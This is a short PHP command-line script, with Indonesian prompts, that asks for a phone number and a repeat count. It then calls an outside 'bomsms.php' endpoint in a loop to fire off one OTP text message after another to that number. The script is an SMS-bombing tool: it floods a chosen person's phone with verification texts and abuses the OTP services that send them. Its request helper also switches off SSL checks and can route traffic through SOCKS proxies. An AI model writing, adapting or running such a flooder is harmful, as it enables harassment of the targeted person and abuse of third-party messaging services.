<?php

function curl($url, $data = null, $headers = null, $proxy = null, $method = null) {

        $ch = curl_init();

        $options = array(

                CURLOPT_URL => $url,

                CURLOPT_RETURNTRANSFER => true,

                CURLOPT_SSL_VERIFYHOST => 0,

                CURLOPT_SSL_VERIFYPEER => 0,

                //CURLOPT_HEADER => true,

                CURLOPT_TIMEOUT => 30,

                CURLOPT_FOLLOWLOCATION => true,

        );

        if ($method != "") {

                $options[CURLOPT_CUSTOMREQUEST] = $method;

        }

        if ($data != "") {

                $options[CURLOPT_POST] = true;

                $options[CURLOPT_POSTFIELDS] = $data;

        }

        if ($proxy != "") {

                $options[CURLOPT_HTTPPROXYTUNNEL] =  true;

                $options[CURLOPT_PROXYTYPE] =  CURLPROXY_SOCKS4;

                $options[CURLOPT_PROXY] =  $proxy;

        }

        if ($headers != "") {

                $options[CURLOPT_HTTPHEADER] = $headers;

        }

        curl_setopt_array($ch, $options);

        $result = curl_exec($ch);

        curl_close($ch);

        return $result;

}

function color($color = "default" , $text)

        {

        $arrayColor = array(

                'grey'          => '1;30',

                'red'           => '1;31',

                'green'         => '1;32',

                'yellow'        => '1;33',

                'blue'          => '1;34',

                'purple'        => '1;35',

                'nevy'          => '1;36',

                'white'         => '1;0',

        );

        return "\033[".$arrayColor[$color]."m".$text."\033[0m";

}

echo color('nevy','[?] ').'Nomer: ';

$no = trim(fgets(STDIN));

echo color('nevy','[?] ').'Berapa: ';

$jum = trim(fgets(STDIN));

for($a=1;$a<=$jum;$a++){

$gass = curl('https://izzy27.000webhostapp.com/bomsms.php?Nope='.$no);

if($gass == 'Success send otp'){

echo color("green","[✓] ")."Success send otp".color("green"," [$a]\n");;

}else{

echo color("red","[×] ")."Failed send otp".color("red"," [$a]\n");

}

}

?>
